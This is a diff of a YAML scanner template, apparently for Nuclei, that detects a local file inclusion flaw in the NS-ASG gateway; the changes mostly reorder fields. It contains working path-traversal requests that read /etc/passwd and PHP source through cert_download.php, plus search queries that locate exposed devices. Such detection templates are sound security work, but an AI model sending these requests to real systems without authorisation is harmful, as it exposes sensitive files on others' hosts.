@@ -1,5 +1,4 @@
 id: nsasg-arbitrary-file-read
-
 info:
   name: NS ASG - Local File Inclusion
   author: pikpikcu,ritikchaddha
@@ -7,38 +6,35 @@ info:
   description: NS ASG is vulnerable to local file inclusion.
   reference:
     - https://zhuanlan.zhihu.com/p/368054963
-    - http://wiki.xypbk.com/Web安全/网康%20NS-ASG安全网关/网康%20NS-ASG安全网关%20任意文件读取漏洞.md
+    - http://wiki.xypbk.com/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E5%BA%B7%20NS-ASG%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3/%E7%BD%91%E5%BA%B7%20NS-ASG%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
     cvss-score: 7.5
     cwe-id: CWE-22
     cpe: cpe:2.3:h:netentsec:ns-asg:*:*:*:*:*:*:*:*
   metadata:
+    fofa-query: app="网康科技-NS-ASG安全网关"
     max-request: 2
-    vendor: netentsec
     product: ns-asg
     shodan-query: http.title:“NS-ASG”
-    fofa-query: app="网康科技-NS-ASG安全网关"
-  tags: nsasg,lfi,vuln
-
+    vendor: netentsec
+  tags: lfi,nsasg,vuln
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/admin/cert_download.php?file=pqpqpqpq.txt&certfile=../../../../../../../../etc/passwd"
-      - "{{BaseURL}}/admin/cert_download.php?file=pqpqpqpq.txt&certfile=cert_download.php"
+  - matchers:
+      - regex:
+          - 'root:.*:0:0:'
+        type: regex
+      - condition: and
+        # digest: 490a0046304402201aa441d5390629de3a6981250c7631168a7051b4e65586b796d4227fcf43ce7a02207320961070dbe10312f3e529e842b980aef958ebdebc242b60f41c3527ab2ff1:922c64590222798bb761d5b6d8e72950
 
-    stop-at-first-match: true
-
-    matchers-condition: or
-    matchers:
-      - type: regex
-        regex:
-          - "root:.*:0:0:"
-
-      - type: word
         part: body
+        type: word
         words:
-          - "$certfile"
-          - "application/pdf"
-        condition: and
-
+          - $certfile
+          - application/pdf
+    matchers-condition: or
+    method: GET
+    path:
+      - '{{BaseURL}}/admin/cert_download.php?file=pqpqpqpq.txt&certfile=../../../../../../../../etc/passwd'
+      - '{{BaseURL}}/admin/cert_download.php?file=pqpqpqpq.txt&certfile=cert_download.php'
+    stop-at-first-match: true
